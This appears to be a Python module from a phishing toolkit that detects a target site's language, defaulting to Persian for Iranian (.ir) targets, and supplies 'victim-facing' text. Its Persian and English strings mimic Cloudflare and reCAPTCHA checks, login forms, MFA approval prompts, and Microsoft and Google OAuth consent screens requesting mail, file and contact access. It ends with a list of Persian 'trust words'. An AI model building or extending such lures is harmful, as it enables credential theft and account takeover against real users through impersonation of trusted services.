"""Locale detection + message catalog for victim-facing strings.

Why this module exists
----------------------
Several techniques (T6 redirect page, T16/T17 CAPTCHA overlays, T19 QR
landing text, T21 MFA prompts, T22 OAuth consent, T25 baseline login form)
inject text that the *victim* sees. The reviewer requires those strings
to be in Persian by default and match the target site's language. We
auto-detect language from the source HTML and look up Persian (`fa`) or
English (`en`) strings from a single catalog.

Public surface:
- `detect_language(html) -> str` — returns ISO 639-1 like "fa", "en"
- `t(message_id, lang, **vars) -> str` — catalog lookup with .format()
- `MESSAGES` — the catalog itself, exposed for tests
"""
from __future__ import annotations

import re

_PERSIAN_RE = re.compile(r"[؀-ۿݐ-ݿﭐ-﷿ﹰ-﻿]")
_LATIN_RE = re.compile(r"[A-Za-z]")
_HTML_LANG_RE = re.compile(r"<html\b[^>]*\blang\s*=\s*[\"']?([A-Za-z]{2,3})", re.IGNORECASE)
_VISIBLE_TEXT_RE = re.compile(r">([^<]+)<")


def detect_language(html: str, url: str = "") -> str:
    """Return the detected language code for a page.

    Order of precedence:
      0. TLD of `url` when provided: `.ir` always → "fa" (many Iranian
         sites set `<html lang="en">` but are operated in Persian; reviewer
         requires all injected text to be in Persian for Iranian targets).
      1. `<html lang="xx">` attribute if non-empty.
      2. Character-class ratio in visible body text:
         - ≥30% Persian/Arabic codepoints → "fa"
         - else if ≥50% Latin and Persian < 5% → "en"
      3. Default "fa" (the reviewer-mandated fallback).

    Only the first ~4KB of HTML is scanned — enough to characterise the
    page without paying for full BS4 parsing.
    """
    if not html:
        return "fa"

    if url:
        try:
            import urllib.parse as _up
            netloc = _up.urlparse(url if "://" in url else "https://" + url).netloc
            host = netloc.split(":")[0].lower()
            if host.endswith(".ir") or host == "ir":
                return "fa"
        except Exception:
            pass

    head = html[:4096]
    m = _HTML_LANG_RE.search(head)
    if m:
        code = m.group(1).lower()
        return code.split("-", 1)[0]

    sample = "".join(_VISIBLE_TEXT_RE.findall(html[:8192]))
    if not sample.strip():
        return "fa"

    persian_n = len(_PERSIAN_RE.findall(sample))
    latin_n = len(_LATIN_RE.findall(sample))
    total = persian_n + latin_n
    if total == 0:
        return "fa"
    persian_ratio = persian_n / total
    latin_ratio = latin_n / total

    if persian_ratio >= 0.30:
        return "fa"
    if latin_ratio >= 0.50 and persian_ratio < 0.05:
        return "en"
    return "fa"


MESSAGES: dict[str, dict[str, str]] = {
    "fa": {
        "redirect.title":          "لطفاً منتظر بمانید…",
        "redirect.body":           "در حال انتقال، لطفاً منتظر بمانید…",

        "captcha.cf.brand":        "Cloudflare",
        "captcha.cf.headline":     "لحظه‌ای صبر کنید…",
        "captcha.cf.checking":     "در حال بررسی مرورگر شما برای دسترسی به <strong>{domain}</strong>",
        "captcha.cf.subtext":      "این فرایند خودکار است. مرورگر شما به‌زودی به محتوای درخواستی منتقل می‌شود.<br>لطفاً تا ۵ ثانیه صبر کنید…",
        "captcha.cf.footer_left":  "محافظت در برابر حمله DDoS توسط <b>Cloudflare</b>",
        "captcha.cf.footer_right": "شناسه Ray:&nbsp;{ray_id}&ensp;&bull;&ensp;عملکرد و امنیت توسط Cloudflare",
        "captcha.cf.success":      "تأیید با موفقیت انجام شد",
        "captcha.cf.redirecting":  "در حال انتقال…",
        "captcha.rc.title":        "بررسی امنیتی",
        "captcha.rc.checkbox":     "من ربات نیستم",
        "captcha.rc.brand":        "reCAPTCHA &bull; حریم خصوصی &bull; شرایط",

        "captcha.flow.title":           "تأیید امنیتی — {domain}",
        "captcha.flow.heading":         "یک مرحله دیگر",
        "captcha.flow.instructions":    "لطفاً برای ادامه به {domain}، تأیید امنیتی را تکمیل کنید.",
        "captcha.flow.checkbox":        "من ربات نیستم",
        "captcha.flow.footer":          "محافظت توسط Cloudflare &bull; حریم خصوصی &bull; شرایط",
        "captcha.flow.signin_title":    "ورود — {domain}",
        "captcha.flow.signin_heading":  "ورود به حساب",
        "captcha.flow.verifying":       "در حال بررسی…",
        "captcha.flow.checking":        "در حال بررسی مرورگر شما…",
        "captcha.flow.verified":        "تأیید موفق انجام شد",
        "captcha.flow.redirecting":     "در حال انتقال به {domain}…",

        "form.label.email_or_phone":    "ایمیل یا شماره تلفن",
        "form.label.username_or_email": "نام کاربری یا ایمیل",
        "form.label.password":          "گذرواژه",
        "form.button.signin":           "ورود",
        "form.button.signin_to":        "ورود به {domain}",
        "form.button.next":             "بعدی",
        "form.button.cancel":           "انصراف",
        "form.button.approve":          "تأیید",
        "form.button.deny":             "رد",
        "form.button.verify":           "بررسی",
        "form.button.accept":           "پذیرش",
        "form.button.allow":            "اجازه",
        "form.placeholder.otp":         "کد ۶ رقمی",

        "qr.scan_to_continue":          "برای ادامه اسکن کنید",

        "mfa.otp.title":                "کد تأیید را وارد کنید",
        "mfa.otp.instructions":         "کدی برای دستگاه شما در {domain} ارسال شد.",
        "mfa.push.title":               "تأیید درخواست ورود",
        "mfa.push.instructions":        "درخواست ورودی برای {domain} ثبت شده است.",
        "mfa.push.disclaimer":          "اگر شما این درخواست را آغاز نکرده‌اید، روی <b>رد</b> بزنید.",
        "mfa.context.device":           "دستگاه: <b>{device}</b>",
        "mfa.context.location":         "موقعیت: {location} ({ip})",
        "mfa.context.threat":           "سطح تهدید: متوسط",
        "mfa.success.msg":              "احراز هویت تأیید شد",
        "mfa.success.sub":              "به‌زودی هدایت می‌شوید…",

        "oauth.ms.title":               "{app_name} درخواست دسترسی دارد | مایکروسافت",
        "oauth.ms.heading":             "دسترسی‌های درخواستی",
        "oauth.ms.instructions":        "<span class=\"app-name\">{app_name}</span> درخواست دسترسی به موارد زیر را دارد:",
        "oauth.ms.footer":              "مایکروسافت &bull; حریم خصوصی &bull; شرایط استفاده",
        "oauth.google.title":           "{app_name} می‌خواهد به حساب گوگل شما دسترسی پیدا کند",
        "oauth.google.heading":         "{app_name} می‌خواهد به حساب گوگل شما دسترسی پیدا کند",
        "oauth.google.instructions":    "این اجازه به <strong>{app_name}</strong> داده می‌شود تا:",

        "scope.mail.readwrite":         "خواندن و ارسال ایمیل از طرف شما",
        "scope.mail.send":              "ارسال ایمیل از طرف شما",
        "scope.offline_access":         "دسترسی آفلاین (نگه‌داشتن نشست)",
        "scope.calendars.read":         "خواندن تقویم شما",
        "scope.contacts.read":          "خواندن مخاطبین شما",
        "scope.files.readwrite":        "خواندن و نوشتن فایل‌ها و اسناد شما",
        "scope.user.read":              "ورود به نام شما",
    },
    "en": {
        "redirect.title":          "Please wait…",
        "redirect.body":           "Redirecting, please wait…",

        "captcha.cf.brand":        "Cloudflare",
        "captcha.cf.headline":     "Just a moment…",
        "captcha.cf.checking":     "Checking your browser before accessing <strong>{domain}</strong>",
        "captcha.cf.subtext":      "This process is automatic. Your browser will redirect to your requested content shortly.<br>Please allow up to 5 seconds…",
        "captcha.cf.footer_left":  "DDoS protection by <b>Cloudflare</b>",
        "captcha.cf.footer_right": "Ray ID:&nbsp;{ray_id}&ensp;&bull;&ensp;Performance &amp; security by Cloudflare",
        "captcha.cf.success":      "Verification successful",
        "captcha.cf.redirecting":  "Redirecting…",
        "captcha.rc.title":        "Security Check",
        "captcha.rc.checkbox":     "I'm not a robot",
        "captcha.rc.brand":        "reCAPTCHA &bull; Privacy &bull; Terms",

        "captcha.flow.title":           "Security Verification — {domain}",
        "captcha.flow.heading":         "One more step",
        "captcha.flow.instructions":    "Please complete the security check to continue to {domain}.",
        "captcha.flow.checkbox":        "I'm not a robot",
        "captcha.flow.footer":          "Protected by Cloudflare &bull; Privacy &bull; Terms",
        "captcha.flow.signin_title":    "Sign In — {domain}",
        "captcha.flow.signin_heading":  "Sign in",
        "captcha.flow.verifying":       "Verifying…",
        "captcha.flow.checking":        "Checking your browser…",
        "captcha.flow.verified":        "Verification successful",
        "captcha.flow.redirecting":     "Redirecting to {domain}…",

        "form.label.email_or_phone":    "Email or phone",
        "form.label.username_or_email": "Username or email",
        "form.label.password":          "Password",
        "form.button.signin":           "Sign in",
        "form.button.signin_to":        "Sign in to {domain}",
        "form.button.next":             "Next",
        "form.button.cancel":           "Cancel",
        "form.button.approve":          "Approve",
        "form.button.deny":             "Deny",
        "form.button.verify":           "Verify",
        "form.button.accept":           "Accept",
        "form.button.allow":            "Allow",
        "form.placeholder.otp":         "6-digit code",

        "qr.scan_to_continue":          "Scan to continue",

        "mfa.otp.title":                "Enter verification code",
        "mfa.otp.instructions":         "A verification code was sent to your device for {domain}.",
        "mfa.push.title":               "Approve sign-in request",
        "mfa.push.instructions":        "A sign-in was requested for {domain}.",
        "mfa.push.disclaimer":          "If you did not initiate this, tap <b>Deny</b>.",
        "mfa.context.device":           "Device: <b>{device}</b>",
        "mfa.context.location":         "Location: {location} ({ip})",
        "mfa.context.threat":           "Threat score: medium",
        "mfa.success.msg":              "Authentication approved",
        "mfa.success.sub":              "You will be redirected shortly…",

        "oauth.ms.title":               "{app_name} is requesting permission | Microsoft",
        "oauth.ms.heading":             "Permissions requested",
        "oauth.ms.instructions":        "<span class=\"app-name\">{app_name}</span> is requesting permission to:",
        "oauth.ms.footer":              "Microsoft &bull; Privacy &bull; Terms of use",
        "oauth.google.title":           "{app_name} wants to access your Google Account",
        "oauth.google.heading":         "{app_name} wants to access your Google Account",
        "oauth.google.instructions":    "This will allow <strong>{app_name}</strong> to:",

        "scope.mail.readwrite":         "Read and send mail on your behalf",
        "scope.mail.send":              "Send mail as you",
        "scope.offline_access":         "Maintain access (offline)",
        "scope.calendars.read":         "Read your calendar",
        "scope.contacts.read":          "Read your contacts",
        "scope.files.readwrite":        "Read and write your files",
        "scope.user.read":              "Sign in as you",
    },
}


def t(message_id: str, lang: str = "fa", **vars: object) -> str:
    """Look up `message_id` in the requested language and apply `.format`.

    Fallback chain: `lang` → `en` → return `message_id` itself so missing
    keys are visible during development. `vars` is always passed to
    `.format()`; missing variables fall back to literal `{name}` rather
    than raising, so a partial substitution never breaks rendering.
    """
    catalog = MESSAGES.get(lang) or MESSAGES["en"]
    template = catalog.get(message_id)
    if template is None:
        template = MESSAGES["en"].get(message_id, message_id)
    try:
        return template.format(**vars)
    except KeyError:
        return template


PERSIAN_TRUST_WORDS: list[str] = [
    "ورود",
    "تأیید",
    "حساب",
    "امن",
    "به-روزرسانی",
    "اعتبارسنجی",
]
